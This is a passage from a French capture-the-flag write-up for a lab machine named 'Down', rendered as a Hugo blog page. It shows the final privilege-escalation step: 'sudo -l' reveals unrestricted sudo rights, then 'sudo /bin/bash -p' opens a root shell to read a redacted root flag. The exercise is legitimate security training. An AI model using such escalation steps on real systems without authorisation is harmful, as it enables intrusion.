+</span></span><span class="line"><span class="cl"><span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">3</span> <span class="n">root</span>  <span class="n">root</span>  <span class="mi">4096</span> <span class="n">Sep</span> <span class="mi">13</span>  <span class="mi">2024</span> <span class="o">..</span>
+</span></span><span class="line"><span class="cl"><span class="n">lrwxrwxrwx</span> <span class="mi">1</span> <span class="n">root</span>  <span class="n">root</span>     <span class="mi">9</span> <span class="n">May</span>  <span class="mi">1</span> <span class="mi">22</span><span class="p">:</span><span class="mi">31</span> <span class="o">.</span><span class="n">bash_history</span> <span class="o">-&gt;</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">aleks</span> <span class="n">aleks</span>  <span class="mi">220</span> <span class="n">Jan</span>  <span class="mi">6</span>  <span class="mi">2022</span> <span class="o">.</span><span class="n">bash_logout</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">aleks</span> <span class="n">aleks</span> <span class="mi">3771</span> <span class="n">Jan</span>  <span class="mi">6</span>  <span class="mi">2022</span> <span class="o">.</span><span class="n">bashrc</span>
+</span></span><span class="line"><span class="cl"><span class="n">drwx</span><span class="o">------</span> <span class="mi">2</span> <span class="n">aleks</span> <span class="n">aleks</span> <span class="mi">4096</span> <span class="n">Sep</span>  <span class="mi">6</span>  <span class="mi">2024</span> <span class="o">.</span><span class="n">cache</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">rw</span><span class="o">-------</span> <span class="mi">1</span> <span class="n">aleks</span> <span class="n">aleks</span>   <span class="mi">20</span> <span class="n">May</span> <span class="mi">27</span> <span class="mi">23</span><span class="p">:</span><span class="mi">51</span> <span class="o">.</span><span class="n">lesshst</span>
+</span></span><span class="line"><span class="cl"><span class="n">drwxrwxr</span><span class="o">-</span><span class="n">x</span> <span class="mi">3</span> <span class="n">aleks</span> <span class="n">aleks</span> <span class="mi">4096</span> <span class="n">Sep</span>  <span class="mi">6</span>  <span class="mi">2024</span> <span class="o">.</span><span class="n">local</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">aleks</span> <span class="n">aleks</span>  <span class="mi">807</span> <span class="n">Jan</span>  <span class="mi">6</span>  <span class="mi">2022</span> <span class="o">.</span><span class="n">profile</span>
+</span></span><span class="line"><span class="cl"><span class="n">drwx</span><span class="o">------</span> <span class="mi">2</span> <span class="n">aleks</span> <span class="n">aleks</span> <span class="mi">4096</span> <span class="n">Sep</span>  <span class="mi">6</span>  <span class="mi">2024</span> <span class="o">.</span><span class="n">ssh</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">aleks</span> <span class="n">aleks</span>    <span class="mi">0</span> <span class="n">Sep</span> <span class="mi">15</span>  <span class="mi">2024</span> <span class="o">.</span><span class="n">sudo_as_admin_successful</span>
+</span></span><span class="line"><span class="cl"><span class="n">aleks</span><span class="err">@</span><span class="n">down</span><span class="p">:</span><span class="o">~$</span></span></span></code></pre></div></div>
+<h2 id="shell-en-tant-que-root">Shell en tant que root</h2>
+<p>Je vois avec la commande <code>sudo -l</code> que <code>aleks</code> peut exécuter n&rsquo;importe qu&rsquo;elle commande sans mot de passe. Il fait aussi parti du groupe <code>sudo</code>.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">aleks@down:~$ sudo -l
+</span></span><span class="line"><span class="cl">[sudo] password for aleks:
+</span></span><span class="line"><span class="cl">Matching Defaults entries for aleks on down:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User aleks may run the following commands on down:
+</span></span><span class="line"><span class="cl">    (ALL : ALL) ALL
+</span></span><span class="line"><span class="cl">aleks@down:~$ id
+</span></span><span class="line"><span class="cl">uid=1000(aleks) gid=1000(aleks) groups=1000(aleks),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd)
+</span></span><span class="line"><span class="cl">aleks@down:~$ sudo /bin/bash -p
+</span></span><span class="line"><span class="cl">root@down:/home/aleks# cd /root/
+</span></span><span class="line"><span class="cl">root@down:~# ls -la
+</span></span><span class="line"><span class="cl">total 48
+</span></span><span class="line"><span class="cl">drwx------  6 root root 4096 May 27 23:54 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x 20 root root 4096 May 27 22:03 ..
+</span></span><span class="line"><span class="cl">lrwxrwxrwx  1 root root    9 May  1 22:31 .bash_history -&gt; /dev/null
+</span></span><span class="line"><span class="cl">-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc
+</span></span><span class="line"><span class="cl">drwxr-xr-x  3 root root 4096 Apr 21 10:53 .cache
+</span></span><span class="line"><span class="cl">-rw-------  1 root root   20 May 27 23:54 .lesshst
+</span></span><span class="line"><span class="cl">drwxr-xr-x  3 root root 4096 Sep 15  2024 .local
+</span></span><span class="line"><span class="cl">-rw-r--r--  1 root root  161 Jul  9  2019 .profile
+</span></span><span class="line"><span class="cl">-r------w-  1 root root   33 Apr  8 23:08 root.txt
+</span></span><span class="line"><span class="cl">-rw-r--r--  1 root root   66 Apr  8 23:12 .selected_editor
+</span></span><span class="line"><span class="cl">drwx------  3 root root 4096 Sep  6  2024 snap
+</span></span><span class="line"><span class="cl">drwx------  2 root root 4096 Sep  6  2024 .ssh
+</span></span><span class="line"><span class="cl">-rw-r--r--  1 root root    0 May  1 22:26 .sudo_as_admin_successful
+</span></span><span class="line"><span class="cl">-rw-------  1 root root 2444 May 27 13:06 .viminfo
+</span></span><span class="line"><span class="cl">root@down:~# cat root.txt
+</span></span><span class="line"><span class="cl">&lt;READACTED FLAG&gt;</span></span></code></pre></div></div>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2025-12-11</span>
+            </div><div id="page-views" class="post-info-mod">
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/down/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on X" data-sharer="x" data-url="http://localhost:1313/down/" data-title="Down" data-via="z3rodol" data-hashtags="Easy,Linux,Web,pswm,SSRF"><i class="fab fa-x-twitter" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags" aria-hidden="true"></i>&nbsp;<a href="/tags/easy/">Easy</a>,&nbsp;<a href="/tags/linux/">Linux</a>,&nbsp;<a href="/tags/web/">Web</a>,&nbsp;<a href="/tags/pswm/">Pswm</a>,&nbsp;<a href="/tags/ssrf/">SSRF</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/certified/" class="prev" rel="prev" title="Certified"><i class="fas fa-angle-left" aria-hidden="true"></i>Certified</a>
+            <a href="/eureka/" class="next" rel="next" title="Eureka">Eureka<i class="fas fa-angle-right" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.158.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 1.0.0"><i class="far fa-kiss-wink-heart" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright" aria-hidden="true"></i><span itemprop="copyrightYear">2025 - 2026</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://z3rodol.github.io" target="_blank">z3rodol</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><script src="/lib/autocomplete/autocomplete.min.js"></script><script src="/lib/lunr/lunr.min.js"></script><script src="/lib/lazysizes/lazysizes.min.js"></script><script src="/lib/lightgallery/lightgallery.min.js"></script><script src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js"></script><script src="/lib/clipboard/clipboard.min.js"></script><script src="/lib/sharer/sharer.min.js"></script><script src="/lib/katex/katex.min.js"></script><script src="/lib/katex/contrib/auto-render.min.js"></script><script src="/lib/katex/contrib/copy-tex.min.js"></script><script src="/lib/katex/contrib/mhchem.min.js"></script><script>window.config={"comment":{},"lightgallery":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":15,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script src="/js/theme.js"></script></body>
+</html>
